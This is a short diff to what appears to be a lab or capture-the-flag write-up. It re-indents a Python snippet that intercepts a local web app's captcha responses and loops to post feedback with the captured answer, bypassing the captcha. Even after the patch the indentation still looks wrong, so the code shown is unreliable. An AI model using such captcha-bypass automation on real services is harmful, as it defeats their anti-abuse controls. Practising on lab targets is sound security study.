@@ -23,8 +23,8 @@ We then start a for loop to iterate through each time a form submits, getting th
 			time.sleep(0.1)
 			arr  = []
 			for  request  in  driver.requests:
-			if  request.url  ==  "http://192.168.235.129:3000/rest/captcha/":
-			arr.append(json.loads(request.response.body))
+				if  request.url  ==  "http://192.168.235.129:3000/rest/captcha/":
+				arr.append(json.loads(request.response.body))
 			answer  =  arr[-1]
 			requests.post("http://192.168.235.129:3000/api/Feedbacks/", data={"captchaId":answer.get('captchaId'),"captcha":answer.get('answer'),"comment":"aaaa (anonymous)","rating":2})
 	
